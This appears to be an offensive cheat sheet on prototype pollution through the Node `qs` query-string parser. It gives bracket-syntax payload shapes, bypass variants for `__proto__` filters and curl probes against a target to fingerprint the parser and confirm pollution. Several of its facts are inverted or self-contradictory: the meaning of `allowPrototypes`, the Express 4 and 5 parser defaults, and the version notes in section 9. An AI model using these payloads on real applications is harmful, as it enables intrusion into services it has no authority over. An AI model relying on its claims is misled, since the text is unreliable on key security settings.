# qs / querystring parsing — the bracket-to-object path

`qs` (the extended parser express uses when `query parser` =
`extended`, and the default in many frameworks) turns
`a[b][c]=1` into `{a:{b:{c:1}}}`. That bracket syntax is how
`__proto__` reaches a merge from a form or URL — no JSON needed.

---

## 1. The parse rules that matter

```
a[b]=1        → {a:{b:"1"}}
a[b][c]=1     → {a:{b:{c:"1"}}}
a[]=1         → {a:["1"]}
a=1           → {a:"1"}
a[b]=         → {a:{b:""}}
a             → {a:""}
a[b][c][d]=1  → 4 levels — depthLimit applies (default 5)
a[]=1&a[]=2   → {a:["1","2"]}
a[0]=1&a[1]=2 → {a:{0:"1",1:"2"}} — indices become string keys
```

`qs.parse` builds plain objects — `a[__proto__]=1` builds
`{a:{"__proto__":"1"}}` — the nested `__proto__` key is an own
property of `a`, which a merge then assigns to the target's
`__proto__` slot.

## 2. The pollution shapes

```
__proto__[marker]=1                    → {"__proto__":{"marker":"1"}}
a[__proto__][marker]=1                 → {"a":{"__proto__":{"marker":"1"}}}
constructor[prototype][marker]=1       → {"constructor":{"prototype":{"marker":"1"}}}
a[constructor][prototype][marker]=1    → nested variant
__proto__.marker=1                     → {"__proto__.marker":"1"} — literal dotted KEY
```

The dotted form `__proto__.marker=1` is NOT nested — it is a literal
key string `"__proto__.marker"` — only path-APIs (set/dset) resolve
it; a merge sees one weird key.

## 3. The `simple` vs `extended` split

```js
app.set('query parser', 'simple')   // querystring module — FLAT
app.set('query parser', 'extended') // qs module — nested
```

`simple`: `a[b]=1` → `{"a[b]":"1"}` — the brackets are part of the
key NAME. No nested object, no `__proto__` path. The fingerprint:

```bash
curl "$BASE/x?a[b]=1"
# {"a":{"b":"1"}}   → extended — qs parses brackets
# {"a[b]":"1"}      → simple — literal key
```

`simple` parser + body JSON merge = the JSON body is the carrier,
not the query.

## 4. qs options that change the parse

| Option | Default | Effect on pollution |
|---|---|---|
| `depth` | 5 | `a[b][c][d][e][f]=1` truncated at 5 — deeper `__proto__` paths fail |
| `parameterLimit` | 1000 | many params → `Parameter limit exceeded` 400 |
| `arrayLimit` | 20 | `a[21]` becomes `{"21":"1"}` — index-as-key |
| `allowDots` | false | `a.b=1` stays `{"a.b":"1"}` — literal dot |
| `allowPrototypes` | false | **`qs`'s own proto guard** — `__proto__` keys DROPPED on parse |
| `plainObjects` | false | creates `Object.create(null)` — no proto to walk |
| `parseArrays` | true | `a[]=x` makes arrays |
| `comma` | false | `a=1,2` stays `"1,2"` vs `[1,2]` |

`allowPrototypes: true` on the SERVER'S qs call is the flag that
KILLS this carrier — `qs.parse` with `allowPrototypes: true` drops
`__proto__` keys at parse time. If the query `__proto__[x]=1` echoes
absent from any reflection, this may be why — switch to the JSON
body carrier.

## 5. The body-parser interplay

`body-parser` urlencoded uses qs internally when `extended: true`:

```js
app.use(bodyParser.urlencoded({extended: true}))  // qs — nested
app.use(bodyParser.urlencoded({extended: false})) // querystring — flat
```

Same fingerprinting: `POST` form `a[b]=1` → nested or literal.

## 6. Framework defaults

| Framework | Default parser | Carrier |
|---|---|---|
| Express 4 | `simple` (querystring) unless `extended` set | JSON body mostly |
| Express 5 | qs — `extended`-equivalent | query+form work |
| Fastify | qs-like via `fastify-qs` or default querystring | version-dependent |
| Koa | querystring — flat | JSON body only |
| NestJS | inherits express/fastify's | depends on adapter |
| Hapi | `@hapi/boom`+`qs` — qs | query+form work |
| hapi-qs plugin | qs | same |
| Sails | qs | same |
| Meteor | qs | same |

When in doubt, fingerprint with `?a[b]=1`.

## 7. The `__proto__`-in-qs bypasses

When `qs` drops `__proto__` (`allowPrototypes: true`):

```
constructor[prototype][m]=1          — the alias
a[constructor][prototype][m]=1
proto[m]=1                            — 'proto' isn't __proto__ but
                                        may hit a different parser path
__proto__[m][x]=1                    — deeper nesting
%5f%5fproto%5f%5f%5bm%5d=1           — encoded — the filter runs on
                                       decoded or raw? (both worth one probe)
__proto__%5bm%5d=1                   — encoded brackets only
```

The `allowPrototypes` check runs on the DECODED key — encoding rarely
bypasses it, but costs one probe.

## 8. qs in the JSON body's fields

A JSON body `{"q": "a[b][c]=1"}` where the app re-parses `q` with qs
— the inner qs call is the second carrier. Also
`{"settings": "a[__proto__][m]=1"}` re-parsed by qs into a settings
merge.

## 9. The `qs` version differences

- `qs` < 6.0.0 — no `allowPrototypes` guard at all
- `qs` ≥ 6.0.0 — `allowPrototypes` default false (allows proto KEYS
  in the parsed object but... the guard is on PROTOTYPE
  ASSIGNMENT, not key names — check the version)
- `qs` ≥ 6.9.0 — `plainObjects` option added

The precise semantics: `qs.parse` NEVER calls the `__proto__`
setter — it builds objects with literal keys including `"__proto__"`
as an own property. The pollution happens DOWNSTREAM when a merge
assigns those keys onto a live object — qs's job is only to build
the shape.

## 10. Detection summary

```bash
# 1. does the app use qs?
curl "$BASE/x?a[b]=1" → nested? qs.

# 2. does it allow proto keys?
curl "$BASE/x?__proto__[m]=1" → reflected in any echo?
   - yes → the key passed parse; the merge is the next question
   - absent → allowPrototypes guard; try constructor or JSON body

# 3. is a merge reachable on the query/body?
POST {"a":{"__proto__":{"m":1}}} → fresh-object readback for 'm'
```
